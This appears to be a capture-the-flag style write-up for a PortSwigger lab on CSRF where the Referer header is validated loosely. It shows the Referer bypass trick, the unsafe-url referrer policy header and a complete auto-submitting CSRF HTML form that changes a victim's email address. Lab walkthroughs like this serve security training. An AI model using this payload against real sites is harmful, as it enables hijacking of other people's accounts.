## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/9abf93b5-0aec-4926-9889-1414d7bc9620)

## Solution :

Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b939c007-ed1f-4744-997a-292111b9214a)

Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b3ec09f0-9391-4883-a40f-2e4515d1d4eb)

Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:

```html
Referer: https://arbitrary-incorrect-domain.net?0a84007a037bd49681013eee007a009d.web-security-academy.net
```

Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b0b37659-f50e-4625-ad91-6c9b8863d1f2)

Create a CSRF proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab and host it on the exploit server. Edit the JavaScript so that the third argument of the history.pushState() function includes a query string with your lab instance URL as follows:

```html
history.pushState("", "", "/?0a84007a037bd49681013eee007a009d.web-security-academy.net")
```

This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/2cb05514-df8c-4e30-9737-b7ba395e5924)

If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0a0c6398-d3da-4cbe-a948-905210e0250d)

This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:

`Referrer-Policy: unsafe-url`

Note that unlike the normal Referer header, the word "referrer" must be spelled correctly in this case.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/62f801a8-9244-45d2-99b6-d338f21c5356)

Final paload-

```html
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://0a84007a037bd49681013eee007a009d.web-security-academy.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="cybe4&#64;gmail&#46;com" />

      <input type="submit" value="Submit request" />

    </form>

    <script>

      history.pushState('', '', '/?0a84007a037bd49681013eee007a009d.web-security-academy.net');

      document.forms[0].submit();

    </script>

  </body>

</html>

```

Store the exploit, then click "Deliver to victim" to solve the lab.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/0918141d-b969-4646-954e-d5bd4fe84775)
